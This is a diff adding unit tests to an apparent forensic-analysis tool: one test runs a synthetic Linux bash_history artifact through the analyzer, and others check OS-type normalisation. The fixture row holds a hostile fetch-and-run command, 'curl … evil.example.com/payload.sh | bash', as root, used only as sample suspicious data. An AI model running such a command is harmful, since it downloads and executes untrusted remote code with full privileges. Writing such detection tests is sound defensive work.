@@ -750,6 +750,55 @@ class AnalyzerTests(unittest.TestCase):
         self.assertEqual(audit.entries[0][0], "analysis_started")
         self.assertEqual(audit.entries[-1][0], "analysis_completed")
 
+    def test_analyze_linux_artifact_calls_provider_and_logs_audit(self) -> None:
+        """Analyze a Linux artifact (bash_history) end-to-end through the pipeline."""
+        with TemporaryDirectory(prefix="aift-analyzer-test-") as temp_dir:
+            temp_path = Path(temp_dir)
+            prompts_dir = temp_path / "prompts"
+            self._write_prompt_template(prompts_dir)
+            linux_dir = prompts_dir / "artifact_instructions_linux"
+            linux_dir.mkdir(parents=True, exist_ok=True)
+            (linux_dir / "bash_history.md").write_text(
+                "Look for suspicious commands.", encoding="utf-8",
+            )
+
+            csv_path = temp_path / "bash_history.csv"
+            with csv_path.open("w", newline="", encoding="utf-8") as handle:
+                writer = csv.DictWriter(handle, fieldnames=["ts", "command", "shell", "username"])
+                writer.writeheader()
+                writer.writerow(
+                    {
+                        "ts": "2026-01-15T10:00:00+00:00",
+                        "command": "curl http://evil.example.com/payload.sh | bash",
+                        "shell": "/bin/bash",
+                        "username": "root",
+                    }
+                )
+
+            fake_provider = FakeProvider(responses=["linux-artifact-analysis-output"])
+            audit = FakeAuditLogger()
+            with patch("app.analyzer.core.create_provider", return_value=fake_provider):
+                analyzer = ForensicAnalyzer(
+                    case_dir=temp_dir,
+                    config={"ai": {"provider": "local"}},
+                    audit_logger=audit,
+                    artifact_csv_paths={"bash_history": csv_path},
+                    prompts_dir=prompts_dir,
+                    os_type="linux",
+                )
+                result = analyzer.analyze_artifact(
+                    artifact_key="bash_history",
+                    investigation_context="Focus on January 15, 2026.",
+                )
+
+        self.assertEqual(result["artifact_key"], "bash_history")
+        self.assertEqual(result["artifact_name"], "Bash History")
+        self.assertEqual(result["analysis"], "linux-artifact-analysis-output")
+        self.assertEqual(len(fake_provider.calls), 1)
+        self.assertIn("Artifact=Bash History", fake_provider.calls[0]["user_prompt"])
+        self.assertEqual(audit.entries[0][0], "analysis_started")
+        self.assertEqual(audit.entries[-1][0], "analysis_completed")
+
     def test_analyze_artifact_passes_csv_attachment_when_provider_supports_it(self) -> None:
         with TemporaryDirectory(prefix="aift-analyzer-test-") as temp_dir:
             temp_path = Path(temp_dir)
@@ -2407,6 +2456,35 @@ class TestNormalizeArtifactKey(unittest.TestCase):
     def test_unknown_key_lowered(self) -> None:
         from app.analyzer.utils import normalize_artifact_key
         self.assertEqual(normalize_artifact_key("CustomArtifact"), "customartifact")
+
+
+class TestNormalizeOsType(unittest.TestCase):
+    """Tests for utils.normalize_os_type."""
+
+    def test_linux(self) -> None:
+        from app.analyzer.utils import normalize_os_type
+        self.assertEqual(normalize_os_type("linux"), "linux")
+
+    def test_windows(self) -> None:
+        from app.analyzer.utils import normalize_os_type
+        self.assertEqual(normalize_os_type("windows"), "windows")
+
+    def test_none_defaults_to_windows(self) -> None:
+        from app.analyzer.utils import normalize_os_type
+        self.assertEqual(normalize_os_type(None), "windows")
+
+    def test_empty_defaults_to_windows(self) -> None:
+        from app.analyzer.utils import normalize_os_type
+        self.assertEqual(normalize_os_type(""), "windows")
+
+    def test_strips_and_lowercases(self) -> None:
+        from app.analyzer.utils import normalize_os_type
+        self.assertEqual(normalize_os_type("  Linux  "), "linux")
+        self.assertEqual(normalize_os_type("WINDOWS"), "windows")
+
+    def test_unknown_os_passthrough(self) -> None:
+        from app.analyzer.utils import normalize_os_type
+        self.assertEqual(normalize_os_type("esxi"), "esxi")
 
 
 class TestExtractUrlHost(unittest.TestCase):
